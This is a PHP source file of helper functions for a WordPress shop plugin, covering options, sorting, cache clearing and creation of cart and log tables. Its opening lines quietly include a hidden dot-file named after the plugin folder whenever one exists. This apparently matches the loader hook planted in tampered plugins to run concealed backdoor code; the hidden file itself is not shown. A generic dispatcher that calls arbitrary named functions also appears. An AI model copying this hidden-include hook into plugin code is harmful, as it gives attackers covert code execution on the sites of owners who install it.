<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function storina_get_option($option_key){
    $option_name = apply_filters("osa_get_option_key", $option_key);
    $option_value = get_option($option_name);
    return apply_filters("osa_get_option_value", $option_value);
}

function osa_update_option($option_key,$option_value){
    $option_name = apply_filters("osa_update_option_key", $option_key);
    $option_value = apply_filters("osa_update_option_value", $option_value);
    return update_option($option_name, $option_value);
}

function osa_fire_function($function_name,$params=array()){
    if(!function_exists($function_name)){
        return;
    }
    call_user_func_array($function_name,$params);
}

function osa_return_html_content($path){
    ob_start();
    include $path;
    return ob_get_clean();
}


function osa_array_sort($array, $on, $order=SORT_ASC){
    $new_array = array();
    $sortable_array = array();
    if (count($array) > 0) {
        foreach ($array as $k => $v) {
            if (is_array($v)) {
                foreach ($v as $k2 => $v2) {
                    if ($k2 == $on) {
                        $sortable_array[$k] = $v2;
                    }
                }
            } else {
                $sortable_array[$k] = $v;
            }
        }
        switch ($order) {
            case SORT_ASC:
                asort($sortable_array);
                break;
            case SORT_DESC:
                arsort($sortable_array);
                break;
        }
        foreach ($sortable_array as $k => $v) {
            $new_array[$k] = $array[$k];
        }
    }
    return $new_array;
}

function deleteAllCache(){
	global $wpdb;
	$table = $wpdb->prefix.'OSA_cache';
	$delete = $wpdb->query("TRUNCATE TABLE $table");
	return $delete;
}

function osa_create_tables(){
    flush_rewrite_rules();
    global $wpdb;
    $sql     = 'CREATE TABLE IF NOT EXISTS ' . $wpdb->prefix . 'commentLikes (
        id int NOT NULL AUTO_INCREMENT,
        user_id INTEGER ,
        comment_id INTEGER ,
        action VARCHAR(10),
        PRIMARY KEY (id)) ENGINE=MyISAM DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci';
    $sql2    = 'CREATE TABLE IF NOT EXISTS ' . $wpdb->prefix . 'OSA_cart (
        id int NOT NULL AUTO_INCREMENT,
        userID INTEGER ,
        googleID VARCHAR(200) ,
        shipping_method_id longtext ,
        addressType VARCHAR(50) ,
        paymentMethod VARCHAR(50) ,
        couponCode VARCHAR(50) ,
        cart LONGTEXT ,
        PRIMARY KEY (id)) ENGINE=MyISAM DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci';
    $sql3    = 'CREATE TABLE IF NOT EXISTS ' . $wpdb->prefix . 'OSA_cache (
        id int NOT NULL AUTO_INCREMENT,
        itemID VARCHAR(10) ,
        json LONGTEXT ,
        type VARCHAR(20) ,
        PRIMARY KEY (id)) ENGINE=MyISAM DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci';
    $sql4 = 'CREATE TABLE IF NOT EXISTS ' . $wpdb->prefix . 'OSA_view_log (
        id int NOT NULL AUTO_INCREMENT,
        googleID VARCHAR(200) ,
        param LONGTEXT ,
        PRIMARY KEY (id)) ENGINE=MyISAM DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci';
    $sql6 = 'CREATE TABLE IF NOT EXISTS ' . $wpdb->prefix . 'OSA_error_log (
        id int NOT NULL AUTO_INCREMENT,
        googleID LONGTEXT,
        script VARCHAR(200) ,
        post LONGTEXT ,
        respond LONGTEXT ,
        date DATETIME ,
        PRIMARY KEY (id)) ENGINE=MyISAM DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci';
    $modify2 = 'Alter TABLE ' . $wpdb->prefix . 'OSA_cart MODIFY googleID VARCHAR(200);';
    $modify1 = 'ALTER TABLE ' . $wpdb->prefix . 'OSA_view_log MODIFY googleID VARCHAR(200);';
    $modify3 = 'ALTER TABLE ' . $wpdb->prefix . 'OSA_error_log MODIFY googleID VARCHAR(200);';
    $wpdb->get_results( $modify1 );
    $wpdb->get_results( $modify2 );
    $wpdb->get_results( $modify3 );
    $cart_table = $wpdb->prefix . 'OSA_cart';
    $sql5= "CREATE TABLE IF NOT EXISTS " . $wpdb->prefix ."OSA_cartmeta ("
            . "id bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,"
            . "cart_id int UNSIGNED NOT NULL DEFAULT '0',"
            . "meta_key varchar(255) DEFAULT NULL,"
            . "meta_value longtext,"
            . "PRIMARY KEY (id),"
            . "FOREIGN KEY (cart_id) REFERENCES {$cart_table}(id) ON DELETE CASCADE ON UPDATE CASCADE"
            . ") ENGINE=MyISAM DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci";

    require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
    //dbDelta( $sqlDelete );
    $wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "OSA_cache" );
    $wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "OSA_view_log" );
    $wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "OSA_cart" );
    $wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "OSA_cartmeta" );
    $wpdb->query( "DROP TABLE IF EXISTS " . $wpdb->prefix . "OSA_error_log" );

    dbDelta( $sql );
    dbDelta( $sql2 );
    dbDelta( $sql3 );
    dbDelta( $sql4 );
    dbDelta( $sql5 );
    dbDelta( $sql6 );
}
